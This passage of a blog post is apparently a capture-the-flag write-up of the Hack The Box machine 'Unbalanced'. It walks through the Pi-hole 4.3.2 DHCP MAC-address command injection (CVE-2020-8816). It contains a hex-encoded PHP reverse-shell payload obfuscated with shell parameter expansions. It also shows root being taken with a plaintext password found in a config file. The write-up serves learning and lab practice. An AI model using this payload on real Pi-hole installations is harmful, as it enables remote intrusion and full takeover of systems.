</pre></table></code></div></div></ul><p><strong><a href="https://pi-hole.net/">Pi-hole</a> :</strong> Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.</p><h2 id="enumerating-pi-hole"><span class="mr-2">enumerating Pi-hole</span><a href="#enumerating-pi-hole" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>check service port</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>bryan@unbalanced:~$ ss -lnpt | grep 127.0.0.1

LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*
LISTEN    0         128              127.0.0.1:5553             0.0.0.0:*
</pre></table></code></div></div><p><strong>Port 5553</strong> is not responding</p><p><strong>Port 8080</strong> give an error</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[ERROR]: Unable to parse results from queryads.php: Unhandled error message (Invalid domain!)
</pre></table></code></div></div></ul><p><em>setup ssh with tunnel</em></p><p><strong>Gobuster</strong></p><p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://127.0.0.1:8080/ -w words -b 200</code></p><p><em>I use <code class="language-plaintext highlighter-rouge">-b</code> to ignore all 200 responses. because of that server’s custom error every request give 200.</em></p><p><strong>found :</strong> <code class="language-plaintext highlighter-rouge">/admin (Status: 301)</code></p><ul><li><p>from the <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080/admin/</code> i got Pi-hole admin panel.</p><li><p>I also find a Pi-hole’s docker public IP that is accessible form squid-proxy -</p><ul><li><p>linpeas scan -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[+] Networks and neighbours
10.10.10.2 dev ens160 lladdr 00:50:56:b9:16:1a REACHABLE
172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
fe80::250:56ff:feb9:161a dev ens160 lladdr 00:50:56:b9:16:1a router STALE
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:16:1a     *        ens160
172.31.179.1     0x1         0x2         02:42:ac:1f:b3:01     *        br-742fc4eb92b1
172.31.11.3      0x1         0x2         02:42:ac:1f:0b:03     *        br-742fc4eb92b1
</pre></table></code></div></div><ul><li><p>these IPs are in the arp table <code class="language-plaintext highlighter-rouge">cat /proc/net/arp</code> -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:16:1a     *        ens160
172.31.179.1     0x1         0x2         02:42:ac:1f:b3:01     *        br-742fc4eb92b1
172.31.11.3      0x1         0x2         02:42:ac:1f:0b:03     *        br-742fc4e	      
</pre></table></code></div></div><p><strong>IP 172.31.179.1</strong> is the same XPath vulnerable host</p><p><strong>IP 172.31.11.3</strong> is Pi-hole docker IP</p></ul></ul><li><p>Access to <code class="language-plaintext highlighter-rouge">172.31.11.3</code> from squid-proxy gives Pi-hole admin console and here i found Pi-hole version is <code class="language-plaintext highlighter-rouge">4.3.2</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1
</pre></table></code></div></div><li><p>On the console i got a pi-hole hostname</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pihole.unbalanced.htb
</pre></table></code></div></div><li><p>login with temporary password:admin - login successful</p><li><p><strong>IP:127.0.0.1</strong> and <strong>IP: 172.31.11.3</strong> give same result because Pi-hole instance is accessible from both local and squid-proxy.</p><li><p>search for Pi-hole 4.3.2 vulnerability i got an exploit from <a href="https://www.exploit-db.com/exploits/48727">ExploitDB</a></p></ul><h2 id="exploting-pi-hole"><span class="mr-2">Exploting Pi-hole</span><a href="#exploting-pi-hole" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Exploit Impact :</strong> Pi-hole Web v4.3.2 (aka AdminLTE) allows Remote Code Execution by privileged dashboard users via a crafted DHCP static lease.</p><p><strong>Exploit Reason :</strong> defining MAC address while configuring DHCP leases form pi-hole is not validate the mac address properly so one can manipulate that mac address field and put reverse shell and execute it.</p><p><strong>refer to <a href="https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/">natedotred bolg</a> for complete exploitation process.</strong></p><p><strong>Goto</strong> Pi-hole Web-Console » Admin-Panel » Settings (login with Password:admin) » DHCP tab</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://172.31.11.3/admin/settings.php?tab=piholedhcp
</pre></table></code></div></div><ul><li><p>legitimate MAC address format should be as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aaaaaaaaaaaa
</pre></table></code></div></div><li><p>The MAC address input can be tampered to execute arbitrary code:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aaaaaaaaaaaa$PATH
</pre></table></code></div></div><li><p>configure <strong>DHCP leas</strong> with tampered MAC</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>MAC address		IP address	Hostname	

aaaaaaaaaaaa$PATH 	10.10.10.200 	10.10.10.200
</pre></table></code></div></div><li><p>got output like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>MAC address										IP address	Hostname	

AAAAAAAAAAAA/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 	10.10.10.200 	10.10.10.200
</pre></table></code></div></div><p>pi-hole “savesettings.php” is responsible for this vulnerability.</p></ul><p><strong>lines 53-57:</strong> The application first validates the MAC address format using the function preg_match().</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>function validMAC($mac_addr)
{
  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
  return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);
}
</pre></table></code></div></div><p><strong>lines 542-550:</strong> then check only <a href="https://www.php.net/manual/en/function.htmlspecialchars.php">html special characters</a> and converts the input to uppercase.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$mac = $_POST["AddMAC"];
if(!validMAC($mac))
{
	$error .= "MAC address (".htmlspecialchars($mac).") is invalid!&lt;br&gt;";
}
$mac = strtoupper($mac);
</pre></table></code></div></div><p><strong>lines 588-592:</strong> then adds the entry to DHCP using a pihole system command.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>if(!strlen($error))
{
	exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
	$success .= "A new static address has been added";
}
</pre></table></code></div></div><p><strong>Exploit exception :</strong> MAC address input convert input data in upperCase letters and if we put shellcode in it. it converts all code in upperCase, As Linux commands are case sensitive, this would fail.</p><p><em>the way to overcome this difficulty is to make use of <strong>environment variables</strong> and <strong>POSIX Shell</strong> Parameter Expansions.</em></p><h3 id="manual-exploit"><span class="mr-2">Manual Exploit</span><a href="#manual-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><h4 id="payload-encoding"><span class="mr-2">payload Encoding</span><a href="#payload-encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p><strong>Reverse Shell Payload :</strong> <code class="language-plaintext highlighter-rouge">aaaaaaaaaaaa&amp;&amp;php -r ‘$sock=fsockopen(“tun0”,4141);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</code></p><p>there are three peices in the payload</p><ul><li><p><strong>First</strong>, MAC address <code class="language-plaintext highlighter-rouge">aaaaaaaaaaaa</code> use as it is.</p><li><p><strong>Second</strong>, environment variables, In the encoded shell command we define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions:</p></ul><p><strong>Example</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ W=${PATH#/???/}
echo $W
bash:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
❯ P=${W%%?????:*}
echo $P
p
</pre></table></code></div></div><p><strong>All variables:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>W=${PATH#/???/}
P=${W%%?????:}
X=${PATH#/???/??}
H=${X%%???:}
Z=${PATH#:/??}
R=${Z%%/}
</pre></table></code></div></div><p>and now the payload looks life this: <code class="language-plaintext highlighter-rouge">&lt;MAC&gt;&amp;&amp;&lt;variables&gt;</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS
</pre></table></code></div></div><p>here <code class="language-plaintext highlighter-rouge">$IFS</code> is a default shell delimiter character which is a space.</p><p><strong>Third</strong>, reverse shell code <code class="language-plaintext highlighter-rouge">'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");\''</code> in hex coded form, inside the php function - <code class="language-plaintext highlighter-rouge">’EXEC(HEX2BIN(“&lt;shellcode&gt;”));’&amp;&amp;</code></p><ul><li><p>I use python to encode payload into hex -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ python2
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; p = 'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");\''
&gt;&gt;&gt; p.encode("hex").upper()
'706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3437222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27'
</pre></table></code></div></div></ul><p><strong>Final payload :</strong> <code class="language-plaintext highlighter-rouge">aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("&lt;shellcode&gt;"));'&amp;&amp;</code></p><p><strong>My Payload :</strong> <code class="language-plaintext highlighter-rouge">aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3339222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&amp;&amp;</code></p><p><strong>Notes:</strong> Both IPs from squid-proxy <code class="language-plaintext highlighter-rouge">172.31.11.3</code> or with ssh tunnel on <code class="language-plaintext highlighter-rouge">127.0.0.1:8080</code> give a reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code></p><h1 id="root-privesc">Root Privesc</h1><ul><li><p>user <code class="language-plaintext highlighter-rouge">www-data</code> is able to read <code class="language-plaintext highlighter-rouge">/root</code> dir</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /root
$ pwd
/root
$ ls -la
-rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
-rw-r--r-- 1 root root    485 Apr  6  2020 pihole_config.sh
</pre></table></code></div></div><li><p>inside <code class="language-plaintext highlighter-rouge">pihole_config.sh</code> file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>$ cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c
  
# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
</pre></table></code></div></div><li><p>there is a Pi-hole admin password: <strong>bUbBl3gUm$43v3Ry0n3!</strong> and su using this password from bryan’s ssh shell worked and get root shell</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>bryan@unbalanced:~$ su - root
Password: bUbBl3gUm$43v3Ry0n3!
root@unbalanced:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unbalanced:~# cat root.txt
8c97fa50************************
</pre></table></code></div></div></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/rsync/" class="post-tag no-text-decoration" >rsync</a> <a href="/tags/encfs-encryption/" class="post-tag no-text-decoration" >encfs encryption</a> <a href="/tags/squid-proxy/" class="post-tag no-text-decoration" >squid proxy</a> <a href="/tags/squidclient/" class="post-tag no-text-decoration" >squidclient</a> <a href="/tags/xpath-injection/" class="post-tag no-text-decoration" >xpath injection</a> <a href="/tags/pihole-4-3-2/" class="post-tag no-text-decoration" >pihole 4.3.2</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Unbalanced - Poorduck&amp;url=https://x00tex.github.io/posts/unbalanced/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Unbalanced - Poorduck&amp;u=https://x00tex.github.io/posts/unbalanced/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/unbalanced/&amp;text=Hackthebox - Unbalanced - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div><div class="card"> <a href="/posts/luanne/"><div class="card-body"> <em class="timeago small" data-ts="1606588200" > 2020-11-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Luanne</h3><div class="text-muted small"><p> Scanning Nmap ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.218 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/academy/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Academy</p></a> <a href="/posts/laboratory/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Laboratory</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
